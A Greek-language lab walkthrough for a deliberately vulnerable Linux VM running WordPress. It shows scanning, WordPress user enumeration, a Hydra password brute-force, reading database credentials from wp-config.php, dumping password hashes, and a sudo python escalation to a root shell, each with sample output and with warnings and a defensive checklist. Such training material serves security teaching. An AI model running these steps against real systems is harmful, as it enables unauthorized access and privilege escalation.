# Εκπαιδευτικό Εργαστήριο Linux Web και Κλιμάκωσης Δικαιωμάτων

> **Μόνο για εξουσιοδοτημένο εργαστήριο.** Χρησιμοποιήστε τις εντολές αποκλειστικά σε σκόπιμα ευάλωτη εικονική μηχανή ή σε σύστημα για το οποίο έχετε ρητή άδεια. Αντικαταστήστε το `172.16.250.3` με τη διεύθυνση του δικού σας εργαστηριακού στόχου.

## Στόχοι μάθησης

Η άσκηση παρουσιάζει μια ελεγχόμενη ροή ελέγχου ασφάλειας: ανακάλυψη υπηρεσιών, απαρίθμηση web εφαρμογής, εξέταση αρχείων και βάσης δεδομένων, έλεγχος λογαριασμών και αξιολόγηση δικαιωμάτων. Κάθε αποτέλεσμα πρέπει να καταγράφεται και να εξηγείται, ώστε να ξεχωρίζουν τα επιβεβαιωμένα γεγονότα από τις υποθέσεις.

Τα παραδείγματα χρησιμοποιούν το `raven.local` και τη διεύθυνση `172.16.250.3`. Οι τιμές είναι εκπαιδευτικές και δεν πρέπει να θεωρηθούν πραγματικά credentials ή στοιχεία πραγματικού συστήματος.

## 1. Ανακάλυψη στόχου

```bash
sudo netdiscover -r 172.16.250.0/24
```

Ενδεικτική έξοδος:

```text
Currently scanning: 172.16.250.0/24
IP                 MAC Address        Vendor
172.16.250.3       08:00:27:AA:BB:CC  VirtualBox
```

Η εντολή ελέγχει το συγκεκριμένο ιδιωτικό υποδίκτυο και εμφανίζει ενεργούς hosts, διευθύνσεις MAC και πιθανό κατασκευαστή. Το `Vendor` μπορεί να υποδεικνύει πλατφόρμα εικονικοποίησης, αλλά δεν αποδεικνύει την ταυτότητα του στόχου. Επιβεβαιώστε τη διεύθυνση από τις ρυθμίσεις του εργαστηρίου.

```bash
echo '172.16.250.3 raven.local' | sudo tee -a /etc/hosts
getent hosts raven.local
```

Αναμενόμενη έξοδος:

```text
172.16.250.3   raven.local
```

Η πρώτη εντολή προσθέτει τοπική αντιστοίχιση ονόματος και IP. Δεν τροποποιεί DNS και δεν αλλάζει τον απομακρυσμένο host. Η `getent hosts` επιβεβαιώνει ότι το όνομα επιλύεται στη σωστή διεύθυνση.

## 2. Σάρωση θυρών και υπηρεσιών

```bash
nmap -sV -sC -p- 172.16.250.3 -oN nmap-raven.txt
```

Ενδεικτική έξοδος:

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4
80/tcp  open  http    Apache httpd 2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC)
```

Η `-p-` ελέγχει όλες τις TCP θύρες. Η `-sV` προσπαθεί να αναγνωρίσει υπηρεσίες και εκδόσεις, ενώ η `-sC` εκτελεί τα προεπιλεγμένα scripts του Nmap. Η έξοδος δείχνει πιθανά σημεία ελέγχου: SSH στη θύρα 22, HTTP στη 80 και RPC bind στη 111. Οι εκδόσεις είναι ενδείξεις και όχι αυτόματη απόδειξη ευπάθειας.

Η `-oN` αποθηκεύει την αναφορά στο `nmap-raven.txt`, ώστε να υπάρχει επαναλήψιμο αρχείο τεκμηρίωσης.

## 3. Έλεγχος web εφαρμογής

```bash
curl -i http://raven.local/
```

Ενδεικτική έξοδος:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.10 (Debian)
Content-Type: text/html; charset=UTF-8

<html> ... </html>
```

Ο κωδικός `200` δηλώνει επιτυχημένη απόκριση. Η κεφαλίδα `Server` παρέχει πιθανή πληροφορία για το λογισμικό web server, αλλά μπορεί να είναι ανακριβής ή να έχει τροποποιηθεί. Το HTML σώμα πρέπει να ελεγχθεί για συνδέσμους, σχόλια, φόρμες και αναφορές σε εφαρμογές.

```bash
gobuster dir -u http://raven.local/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Ενδεικτική έξοδος:

```text
/status:           200
/wordpress:        301
/server-status:    403
```

Το `200` σημαίνει ότι επιστράφηκε περιεχόμενο. Το `301` δείχνει redirect και συχνά δηλώνει υπαρκτό directory που χρειάζεται τελικό `/`. Το `403` σημαίνει ότι ο πόρος αναγνωρίστηκε αλλά απαγορεύτηκε η πρόσβαση. Η ύπαρξη ενός path πρέπει να επαληθεύεται χειροκίνητα.

```bash
nikto -h http://raven.local/
```

Ενδεικτική έξοδος:

```text
+ Server: Apache/2.4.10 (Debian)
+ Retrieved x-powered-by header: PHP/5.6.x
+ /wordpress/: Potentially interesting directory
```

Το Nikto εμφανίζει γνωστές ενδείξεις και συνηθισμένα προβλήματα ρύθμισης. Μπορεί να παράγει false positives, επομένως τα αποτελέσματά του χρειάζονται επιβεβαίωση.

### Έλεγχος HTML σχολίων

```bash
curl -s http://raven.local/ > index.html
grep -inE 'flag|comment|todo|hidden' index.html
```

Ενδεικτική έξοδος:

```text
87:<!-- Training flag: FLAG{example_source_review} -->
```

Το `curl -s` κατεβάζει σιωπηλά τη σελίδα, ενώ το `grep -inE` αναζητά λέξεις-κλειδιά χωρίς διάκριση πεζών/κεφαλαίων και εμφανίζει αριθμό γραμμής. Τα HTML comments αποστέλλονται στον browser, άρα δεν πρέπει να περιέχουν κωδικούς ή άλλα μυστικά.

## 4. Αναγνώριση CMS

```bash
wpscan --url http://raven.local/wordpress/ --enumerate u,vt --plugins-detection passive
```

Ενδεικτική έξοδος:

```text
[i] WordPress version detected: 4.x
[+] URL: http://raven.local/wordpress/
[i] User(s) Identified:
    steven
    michael
```

Η έξοδος υποδεικνύει πιθανή έκδοση CMS και ονόματα λογαριασμών που αποκαλύπτονται από την εφαρμογή. Δεν περιέχει κωδικούς. Τα ευρήματα έκδοσης και plugin πρέπει να συγκρίνονται με αξιόπιστες advisories και να επιβεβαιώνονται.

## 5. Μορφή αιτήματος σύνδεσης

Μέσω των developer tools του browser μπορείτε να δείτε τη μέθοδο, το endpoint και τα πεδία μιας φόρμας. Ένα γενικό παράδειγμα είναι:

```text
POST /wordpress/wp-login.php
Content-Type: application/x-www-form-urlencoded

log=USER&pwd=PASSWORD&wp-submit=Log+In
```

Η μορφή αυτή είναι εκπαιδευτικό παράδειγμα. Τα πεδία και το μήνυμα αποτυχίας πρέπει να ελεγχθούν στη συγκεκριμένη εργαστηριακή εφαρμογή. Δοκιμές password επιτρέπονται μόνο σε εξουσιοδοτημένο, απομονωμένο εργαστήριο, με περιορισμό ρυθμού και εγκεκριμένη wordlist.

```bash
hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form \
'/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' \
-t 4 -f -V
```

Ενδεικτική έξοδος:

```text
[80][http-post-form] host: raven.local   login: steven   password: training-password
1 valid password found
```

Τα `^USER^` και `^PASS^` αντικαθίστανται από τη Hydra. Η `F=incorrect` περιγράφει το κείμενο που χαρακτηρίζει αποτυχία· αν είναι λάθος, το αποτέλεσμα μπορεί να είναι ανακριβές. Η `-t 4` περιορίζει τα παράλληλα αιτήματα και η `-f` σταματά μετά την πρώτη επιτυχία. Η αναφερόμενη επιτυχία πρέπει να επαληθευτεί χειροκίνητα.

## 6. Σύνδεση μέσω SSH

```bash
ssh michael@raven.local
```

Ενδεικτική έξοδος:

```text
michael@raven.local's password:
Linux raven 3.x Debian GNU/Linux
michael@raven:~$
```

Το prompt δείχνει ότι η αυθεντικοποίηση πέτυχε ως `michael`. Δεν σημαίνει ότι ο χρήστης είναι administrator ή root.

```bash
id
hostname
pwd
```

Ενδεικτική έξοδος:

```text
uid=1001(michael) gid=1001(michael) groups=1001(michael)
raven
/home/michael
```

Η `id` εμφανίζει UID, GID και groups. Η `hostname` δείχνει τη μηχανή και η `pwd` τον τρέχοντα κατάλογο. Αυτές οι πληροφορίες επιβεβαιώνουν σε ποιον host και με ποια ταυτότητα εκτελείτε εντολές.

## 7. Τοπικά mail και web αρχεία

```bash
locate /var/mail 2>/dev/null
ls -la /var/mail
cat /var/mail/michael
```

Ενδεικτική έξοδος:

```text
/var/mail
/var/mail/michael
From admin@raven.local ...
Subject: maintenance note
The staging application uses the same credentials as the lab account.
```

Η `locate` χρησιμοποιεί ευρετήριο και μπορεί να μην είναι πλήρης. Η `ls -la` δείχνει permissions, ιδιοκτήτες και timestamps. Η `cat` εμφανίζει το περιεχόμενο του mail. Σε πραγματικό περιβάλλον, το mail είναι ιδιωτικό δεδομένο και πρέπει να εξετάζεται μόνο με κατάλληλη εξουσιοδότηση.

```bash
find /var/www -maxdepth 3 -type f -printf '%M %u %g %p\n' 2>/dev/null
```

Ενδεικτική έξοδος:

```text
-rw-r--r-- www-data www-data /var/www/html/index.php
-rw-r--r-- www-data www-data /var/www/html/flag2.txt
-rw-r--r-- www-data www-data /var/www/html/wordpress/wp-config.php
```

Η `find` εμφανίζει αρχεία έως τρία επίπεδα βάθους. Η μορφή δείχνει permissions, owner, group και path. Το `wp-config.php` μπορεί να περιέχει ρυθμίσεις βάσης δεδομένων. Η εμφάνιση ενός αρχείου δεν αποδεικνύει από μόνη της ότι ο τρέχων χρήστης μπορεί να το διαβάσει.

## 8. Configuration secrets

```bash
sed -n '1,160p' /var/www/html/wordpress/wp-config.php
```

Ενδεικτική έξοδος:

```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
```

Οι γραμμές προσδιορίζουν database name, user, password και host. Το παράδειγμα δείχνει γιατί δεν πρέπει να αποθηκεύονται secrets σε αρχεία που είναι αναγνώσιμα από όλους και γιατί μια web εφαρμογή δεν πρέπει να χρησιμοποιεί database superuser.

```bash
stat -c '%A %U:%G %n' /var/www/html/wordpress/wp-config.php
```

Ενδεικτική έξοδος:

```text
-rw-r--r-- www-data:www-data /var/www/html/wordpress/wp-config.php
```

Το `-rw-r--r--` σημαίνει ότι owner, group και άλλοι χρήστες μπορούν να διαβάσουν το αρχείο. Σε production το αρχείο πρέπει, σύμφωνα με τη σχεδίαση ανάπτυξης, να είναι αναγνώσιμο μόνο από τον service account και τους administrators. Τα πραγματικά credentials πρέπει να αποκρύπτονται και να περιστρέφονται.

## 9. Έλεγχος βάσης δεδομένων

```bash
mysql -u root -p
```

Μετά τη σύνδεση, χρησιμοποιήστε read-only queries:

```sql
SHOW DATABASES;
USE wordpress;
SHOW TABLES;
SELECT ID, user_login, user_pass FROM wp_users;
```

Ενδεικτική έξοδος:

```text
Database
information_schema
mysql
wordpress

Tables_in_wordpress
wp_options
wp_posts
wp_users

ID  user_login  user_pass
1   steven       $P$...redacted-hash...
2   michael      $P$...redacted-hash...
```

Η `SHOW DATABASES` απαριθμεί τις βάσεις που είναι ορατές στον λογαριασμό. Η `USE` επιλέγει τη βάση και η `SHOW TABLES` εμφανίζει τους πίνακες. Το `wp_users` περιέχει usernames και password hashes. Το hash δεν είναι ο αρχικός κωδικός, αλλά αδύναμοι κωδικοί μπορεί να ελεγχθούν offline σε εξουσιοδοτημένο εργαστήριο. Μην δημοσιεύετε πραγματικά hashes.

```bash
mysql -u root -p -D wordpress -e \
'SELECT ID,user_login FROM wp_users;' > wordpress-users.txt
cat wordpress-users.txt
```

Ενδεικτική έξοδος:

```text
ID  user_login
1   steven
2   michael
```

Η εντολή εξάγει μόνο IDs και usernames, χωρίς hashes. Η `-e` εκτελεί ένα query και τερματίζει, άρα είναι κατάλληλη για επαναλήψιμη συλλογή απο-ταυτοποιημένων στοιχείων.

## 10. Έλεγχος sudo

```bash
sudo -l
```

Περιορισμένος λογαριασμός:

```text
User michael may not run sudo on raven.
```

Λανθασμένη ρύθμιση:

```text
User steven may run the following commands on raven:
    (root) /usr/bin/python
```

Η `sudo -l` εμφανίζει τι μπορεί να εκτελέσει ο χρήστης μέσω sudo. Η δυνατότητα εκτέλεσης γενικού interpreter ως root είναι σοβαρή παραβίαση least privilege, επειδή ο interpreter μπορεί να εκτελέσει εντολές συστήματος. Η σωστή άμυνα είναι η αφαίρεση του ευρέος κανόνα και η αντικατάστασή του με μία αυστηρά περιορισμένη διοικητική ενέργεια.

## 11. Επιβεβαίωση αντίκτυπου

Μόνο στο εκπαιδευτικό VM:

```bash
sudo /usr/bin/python -c 'import os; print(os.geteuid()); print(os.getuid())'
```

Ενδεικτική έξοδος:

```text
0
0
```

Στο Linux, το UID `0` αντιστοιχεί στον root. Η έξοδος επιβεβαιώνει ότι ο interpreter εκτελέστηκε με root privileges, χωρίς να απαιτείται άμεσο interactive shell.

Για εκπαιδευτική επίδειξη pseudo-terminal:

```bash
sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
```

Ενδεικτική έξοδος:

```text
root@raven:/home/steven# id
uid=0(root) gid=0(root) groups=0(root)
```

Η `pty.spawn` δημιουργεί πιο λειτουργικό interactive shell. Η `id` επιβεβαιώνει UID και groups. Σε πραγματικό σύστημα, η αντιμετώπιση είναι η διόρθωση του sudoers rule και ο έλεγχος των logs, όχι η εκτέλεση αυθαίρετων εντολών.

## 12. Τεκμηρίωση εργαστηριακών στοιχείων

```bash
find /root /home /var/www -maxdepth 3 -type f -iname '*flag*' -print 2>/dev/null
```

Ενδεικτική έξοδος:

```text
/root/flag4.txt
/home/steven/flag3.txt
/var/www/html/flag2.txt
```

Η εντολή αναζητά filenames που περιέχουν `flag`, περιορίζει το βάθος σε τρία επίπεδα και κρύβει permission errors. Διαβάστε τα αρχεία μόνο όσο απαιτεί η άσκηση και τεκμηριώστε τη διαδρομή πρόσβασης, όχι περιττά μυστικά.

## Αμυντική λίστα ελέγχου

- Χρησιμοποιείτε απομονωμένο δίκτυο και επιβεβαιώνετε εξουσιοδότηση πριν από σάρωση.
- Απενεργοποιείτε directory listings και αφαιρείτε μυστικά από HTML σχόλια.
- Ενημερώνετε web server, PHP, CMS, themes και plugins.
- Προστατεύετε configuration files και χρησιμοποιείτε secrets manager όπου είναι κατάλληλο.
- Χρησιμοποιείτε μοναδικούς κωδικούς και MFA όπου είναι δυνατό.
- Δίνετε στις βάσεις δεδομένων μόνο τα απαιτούμενα δικαιώματα.
- Ελέγχετε sudoers entries για interpreters, editors και shells.
- Καταγράφετε authentication, database, web και privilege events.
- Περιστρέφετε άμεσα credentials που μπορεί να εκτέθηκαν.

## Βασικά συμπεράσματα

Η αξιολόγηση αποτελεί αλυσίδα επαληθευμένων παρατηρήσεων: η θύρα αποκαλύπτει υπηρεσία, η απαρίθμηση διαδρομές εφαρμογής, η εξέταση source και configuration αδυναμίες, η βάση δεδομένων σχέσεις λογαριασμών και η `sudo -l` τα όρια δικαιωμάτων. Σε κάθε βήμα αποθηκεύστε την έξοδο και εξηγήστε τι αποδεικνύει. Αυτή η πρακτική βοηθά τόσο την ασφαλή εκπαίδευση σε sandbox όσο και τη διορθωτική ασφάλεια σε production.
